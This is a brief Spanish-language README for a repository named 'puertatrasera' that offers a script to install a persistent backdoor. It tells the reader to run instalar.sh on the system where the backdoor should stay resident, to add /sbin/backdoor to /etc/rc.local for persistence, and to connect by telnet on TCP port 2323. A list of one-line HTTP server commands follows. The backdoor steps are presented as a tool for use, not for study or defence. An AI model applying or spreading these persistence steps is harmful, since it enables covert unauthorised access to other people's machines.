# puertatrasera
Simple Script para crear una backdoor o puertra trasera

# instalar.sh 
( Ejecutar sh instalar.sh para instalar en el sistema que queremos dejar el backdoor residente ). 
Si no funciona editamos el fichero rc.local e incluimos la linea con el scipt:

vi /etc/rc.local

/sbin/backdoor

Otros comandos:

# netcat

while true ; do nc -l 8000 < index.html ; done

# backdoor ( Se instala como un proceso en Linux. Puerto tcp 2323 )

# telnetcliente IP ( cliente telnet para acceder )

# busybox httpd

busybox httpd -f -p 8000

# Python 2.x

python -m SimpleHTTPServer 8000

# Python 3.x

python -m http.server 8000

# Ruby

ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 8000, :DocumentRoot => Dir.pwd).start'

# Ruby 1.9.2+

ruby -run -ehttpd . -p8000

# Php
php -S 127.0.0.1:8000



